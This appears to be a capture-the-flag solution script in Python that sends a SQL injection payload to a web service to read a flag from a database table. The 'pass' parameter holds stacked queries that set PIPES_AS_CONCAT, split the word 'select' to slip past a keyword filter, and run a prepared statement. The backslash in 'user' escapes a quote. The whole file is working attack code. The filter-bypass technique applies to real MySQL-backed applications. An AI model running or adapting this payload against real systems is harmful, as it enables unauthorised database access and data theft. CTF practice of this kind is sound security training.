#!/usr/bin/python3
import requests
import sys
import json

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} host port")
    exit(127)

HOST = sys.argv[1]
PORT = sys.argv[2]
BASE_URL = f"http://{HOST}:{PORT}"

def print_inf(string):
    print(f"\x1b[94m[*] {string}\x1b[0m")


if __name__ == "__main__":

    r = requests.get(
        url=BASE_URL,
        params={
            "user": "\\",
            "pass": ';set sql_mode="PIPES_AS_CONCAT";set @query="sel"||"ect flag from definitely_not_a_flag";prepare my_query from @query;execute my_query;'
        },
    )

    flag = json.loads(r.text.replace('<br/>',''))["flag"]

    print_inf(f"Flag: {flag}")
